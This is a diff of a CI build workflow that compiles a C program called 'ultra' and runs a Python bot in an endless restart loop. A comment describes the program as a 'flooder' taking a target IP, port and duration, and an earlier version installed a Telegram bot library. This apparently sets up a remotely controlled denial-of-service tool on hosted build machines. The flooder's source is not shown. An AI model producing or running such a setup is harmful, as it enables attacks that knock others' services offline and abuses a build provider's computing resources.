@@ -2,61 +2,26 @@ workflows:
   ultra_python_runner:
     name: Ultra Python Runner
     max_build_duration: 60
-
     environment:
       xcode: latest
-
     scripts:
       - name: Check project files
-        script: |
-          echo "📂 Files:"
-          ls -la
-
+        script: ls -la
       - name: Install dependencies
         script: |
           python3 --version
           python3 -m pip install --upgrade pip
-          python3 -m pip install python-telegram-bot aiohttp pymongo pytz psutil
-
-      - name: Prepare ultra binary
+      - name: Compile ultra.c
         script: |
-          set -e
-
-          echo "⚙️ Preparing ultra..."
-
-          if [ -f "ultra.c" ]; then
-            echo "🔧 Compiling ultra.c..."
-
-            if ! command -v gcc &> /dev/null; then
-              echo "❌ gcc not found!"
-              exit 1
-            fi
-
-            gcc ultra.c -o ultra
-
-            if [ $? -ne 0 ]; then
-              echo "❌ Compilation failed!"
-              exit 1
-            fi
-
-            chmod +x ultra
-            echo "✅ Compilation successful"
-
-          elif [ -f "ultra" ]; then
-            echo "📦 Using existing ultra binary..."
-            chmod +x ultra
-
-          else
-            echo "❌ No ultra.c or ultra binary found!"
-            exit 1
-          fi
-
+          gcc -pthread -O3 -o ultra ultra.c
+          chmod +x ultra
       - name: Run bot (auto restart loop)
         script: |
           while true; do
             echo "🚀 Starting bot..."
+            # Example: run flooder with custom IP/port/duration from environment
+            # or just run python3 ultra.py which will call ./ultra
             python3 ultra.py
-
             echo "⚠️ Bot stopped. Restarting in 10 seconds..."
             sleep 10
           done
